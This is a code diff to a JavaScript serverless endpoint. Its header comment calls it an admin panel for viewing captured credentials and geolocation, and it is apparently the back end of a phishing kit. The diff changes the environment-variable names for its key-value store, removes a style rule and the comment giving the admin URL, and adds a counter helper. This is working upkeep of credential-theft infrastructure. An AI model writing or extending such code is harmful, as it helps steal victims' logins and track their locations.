@@ -1,8 +1,7 @@
 // api/retrieve.js — Admin panel to view captured credentials + geolocation
-// Access via: https://your-domain.vercel.app/admin?key=YOUR_SECRET_KEY
 
-const UPSTASH_URL = process.env.UPSTASH_KV_REST_URL;
-const UPSTASH_TOKEN = process.env.UPSTASH_KV_REST_TOKEN;
+const UPSTASH_URL = process.env.KV_REST_API_URL;
+const UPSTASH_TOKEN = process.env.KV_REST_API_TOKEN;
 const KV_PREFIX = "coffee-fence";
 const ADMIN_KEY = process.env.ADMIN_SECRET_KEY || "change-me-in-vercel-env";
 
@@ -70,7 +69,6 @@ async function showList(req, res) {
                 .nav { margin-bottom: 20px; }
                 .nav a { color: #1877f2; text-decoration: none; margin-right: 15px; font-size: 14px; }
                 .nav a:hover { text-decoration: underline; }
-                .badge { background: #e74c3c; color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; }
             </style>
         </head>
         <body>
@@ -189,6 +187,14 @@ async function upstashSet(key, value) {
 
 async function upstashDel(key) {
     const url = `${UPSTASH_URL}/del/${encodeURIComponent(key)}`;
+    await fetch(url, {
+        method: 'POST',
+        headers: { 'Authorization': `Bearer ${UPSTASH_TOKEN}` }
+    });
+}
+
+async function upstashIncr(key) {
+    const url = `${UPSTASH_URL}/incr/${encodeURIComponent(key)}`;
     await fetch(url, {
         method: 'POST',
         headers: { 'Authorization': `Bearer ${UPSTASH_TOKEN}` }
